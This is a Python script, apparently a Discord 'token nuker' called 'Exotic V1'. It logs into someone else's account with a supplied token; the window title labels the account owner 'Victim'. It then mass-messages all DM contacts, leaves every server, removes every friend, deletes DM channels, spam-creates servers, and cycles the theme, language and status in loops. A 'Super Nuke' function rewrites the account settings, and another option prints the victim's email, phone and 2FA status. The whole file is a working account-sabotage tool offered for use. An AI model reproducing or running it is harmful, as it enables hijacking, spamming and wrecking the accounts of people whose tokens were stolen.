import sys, threading, discord, requests, ctypes, os, json
from itertools import cycle
from colored import fg, attr
import time
import datetime
import random
from threading import Thread
import platform
import colorama


date = datetime.datetime.now()
ok = date.strftime("%H:%M:%S")

GUILDIDS = []
FRIENDIDS = []
PRIVATEIDS = []

def close():
    os._exit(0)

def clear():
    if sys.platform.startswith("win"):
        os.system('cls')
    elif sys.platform == 'linux' or 'darwin':
        os.system('clear')

class colors:

    red = fg('#DA2525')
    reset = attr('reset')
    gray = fg('#8D8C8C')

token = input(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Account Token:{colors.red}: {colors.reset}")

client = discord.Client()

def run():
        date = datetime.datetime.now()
        ok = date.strftime("%H:%M:%S")
        try:
            client.run(token, bot=False, reconnect=True)
        except:
            print(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Invalid Token (Can Not Contain "")')
            time.sleep(3)      

class LIE:
    
    @staticmethod
    def ratelimit(status: int, body: str):
        try:
            if status == 429:
                date = datetime.datetime.now()
                ok = date.strftime("%H:%M:%S")
                data = json.load(body)
                print(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Ratelimited Sleeping For {colors.red}{data["retry_after"]}{colors.reset}')
                time.sleep(data["retry_after"])
                pass
        except:
            pass



                          

def splash():
    logo = (f"""{colors.reset}

████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

                                              https://github.com/Kasra001-KH               
                         
    """).replace('█', f"{colors.red}█{colors.reset}").replace("═", f'{colors.reset}═{colors.reset}').replace("║", f'{colors.reset}║{colors.reset}').replace("╔", f"{colors.reset}╔{colors.reset}").replace("╝", f"{colors.reset}╝{colors.reset}").replace("╚", f"{colors.reset}╚{colors.reset}").replace("╗", f"{colors.reset}╗{colors.reset}")
    return logo

def dmall():
    headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
    try:
        sm = input(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} MESSAGE TO DMALL{colors.red}: {colors.reset}")
        for id in PRIVATEIDS:
          try:
            requests.post(
                    f'https://discord.com/api/v8/channels/{id}/messages',
                    headers=headers,
                    data={"content": f"{sm}"})
            
            print(
                f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Dm Sent {colors.red}{id}{colors.reset}"
            )
          except:
            print(
                f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} DM Failed {colors.red}{id}{colors.reset}"
            )
    except:
        pass
    input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Home Menu')
    lie()

    for id in GUILDIDS:
            requests.delete(
                    f'https://discord.com/api/v8/users/@me/guilds/{id}',
                    headers=headers)
            print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} LEFT {colors.red}{id}{colors.reset}")
    input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
    lie()   

def remove_friends(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
        try:
            for friend in FRIENDIDS:
              try:
                 r = requests.delete(
                    f'https://discord.com/api/v8/users/@me/relationships/{friend}',
                    headers=headers)
                 print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} UNFRIENDED {colors.red}{friend}{colors.reset}")
              except:
                 print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} COULDNT UNFRIENDED {colors.red}{friend}{colors.reset}")
              LIE.ratelimit(status=r.status_code, body=r.json()) 
        except:
            pass
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()

def remove_private_channels(token):
    headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
    }
    for id in PRIVATEIDS:
          try:
            r = requests.delete(
                f'https://discord.com/api/v8/channels/{id}',
                headers=headers
            )
            print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} DELETED CHANNEL {colors.red}{id}{colors.reset}")
          except:
               print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} FAILED TO DELETE CHANNEL {colors.red}{id}{colors.reset}")
          LIE.ratelimit(status=r.status_code, body=r.json()) 
    input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press "Enter" To Go Back To The Main Menu')
    lie()

def modes(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
        mod = cycle(["light", "dark"])
        try:
            while True:
                settings = {
                    'theme': next(mod)
                }
                r = requests.patch(
                    'https://discord.com/api/v8/users/@me/settings',
                    headers=headers,
                    json=settings
                )
                LIE.ratelimit(status=r.status_code, body=r.json()) 
        except:
            pass
        input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
        lie()
        
def tokendeath():
      headers = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
      }
      payload = {
          'theme': "light",
          'locale': "hi",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
    
      }

      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      print("Succesfully Nuked")
      print("Press Enter To Go Back To The Main Menu")
      input()
      lie()


def langs(token):
        headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
        locales = [
            "da", "de",
            "en-GB", "en-US",
            "es-ES", "fr",
            "hr", "it",
            "lt", "hu",
            "nl", "no",
            "pl", "pt-BR",
            "ro", "fi",
            "sv-SE", "vi",
            "tr", "cs",
            "el", "bg",
            "ru", "uk",
            "th", "zh-CN",
            "ja", "zh-TW",
            "ko"
        ]
        setting = {
            'locale': random.choice(locales)
        }
        while True:
            try:
                 r = requests.patch(
                    'https://discord.com/api/v8/users/@me/settings',
                    headers=headers,
                    json=setting
                )
            except:
                pass
            LIE.ratelimit(status=r.status_code, body=r.json())
            input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
            lie()

def statusspam():
      headers = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
      }
      payload = {
          'status': "dnd"
      }
      payload2 = {
          'status': "idle"
      }
      payload3 = {
          'status': "invisible"
      } 
      payload4 = {
          'status': "online"
      }
      for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload4)
      lie()

def tokeninfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{colors.red}User ID{colors.reset}]         {userID}
            [{colors.red}User Name{colors.reset}]       {userName}
            [{colors.red}2 Factor{colors.reset}]        {mfa}
            [{colors.red}Email{colors.reset}]           {email}
            [{colors.red}Phone number{colors.reset}]    {phone if phone else ""}
            [{colors.red}Token{colors.reset}]           {token}
            ''')
            print("Press Enter To Go Back To The Home Menu")
            input()
            lie()

def closedm(token):
    headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
    }
    for id in PRIVATEIDS:
          try:
            r = requests.delete(
                f'https://discord.com/api/v8/channels/{id}',
                headers=headers
            )
            print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Closed DM Succesfully! {colors.red}{id}{colors.reset}")
          except:
               print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Failed To Close DM... {colors.red}{id}{colors.reset}")
          LIE.ratelimit(status=r.status_code, body=r.json()) 
    input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
    lie()
           

def create_guilds(token):
    headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
    namez = input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} GUILD NAMES{colors.red}: {colors.reset}')
    guilicon = input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} GUILD ICON(MUST BE A URL) or None{colors.red}: {colors.reset}')
    amount = input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} GUILD AMOUNT{colors.red}: {colors.reset}')
    if guilicon == 'None':
        payload = {
            'name': namez,
            'region': 'europe',
            'icon': None,
            'channels': None
        }
    elif guilicon.startswith('https://'):
        payload = {
            'name': namez,
            'region': 'europe',
            'icon': f'{guilicon}',
            'channels': None
        }
    else:
        payload = {
            'name': namez,
            'region': 'europe',
            'icon': None,
            'channels': None
        } 
    for i in range(int(amount)):
        try:
            r = requests.post('https://discord.com/api/v6/guilds',
                              headers=headers,
                              json=payload)
            print(f"{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Created Server Succesfully {colors.red}{namez}{colors.reset} ({colors.red}{i}{colors.reset})")
        except:
            pass
        LIE.ratelimit(status=r.status_code, body=r.json()) 
    input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} Press Enter To Go Back To The Main Menu')
    lie()
    

def lie():
    clear()
    print(splash())
    m = ('''


                               
                                      [1] Mass DM           [2]  Create Servers  
                              
                                      [3] Lang Change       [4]  Seizure Mode

                                      [5] Super Nuke        [6]  Status Spam
                               
                                      [7] Exit              [8]  Remove Friends

                                      [9] Token Info        [10] Close DMs
                                
    
    
    ''').replace("[", f"{colors.red}[{colors.reset}").replace("]", f"{colors.red}]{colors.reset}")
    print(m)
    choice = input(f'{colors.red}[{colors.reset}{ok}{colors.red}]{colors.reset} @>{colors.red}:{colors.reset} ')
    if choice == '1':
        dmall()
    elif choice == '2':
        create_guilds(token)
    elif choice == '3':
        langs(token)
    elif choice == '4':
        modes(token)
    elif choice == '5':
        tokendeath()
    elif choice == '6':
        statusspam()
    elif choice == '7':
        close()
    elif choice == '8':
        remove_friends(token)
    elif choice == '9':
        tokeninfo(token)
    elif choice == '10':
        closedm(token)
    elif choice.isdigit() == False:
        lie()
    else:
        lie()



@client.event
async def on_connect():
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Exotic V1] | Thanks For Using! | Victim - {client.user.name}#{client.user.discriminator}')
    for g in client.guilds:
        GUILDIDS.append(g.id)
    for c in client.private_channels:
        PRIVATEIDS.append(c.id)
    for f in client.user.friends:
        FRIENDIDS.append(f.id)
    lie()

    


if __name__ == '__main__':
  run()
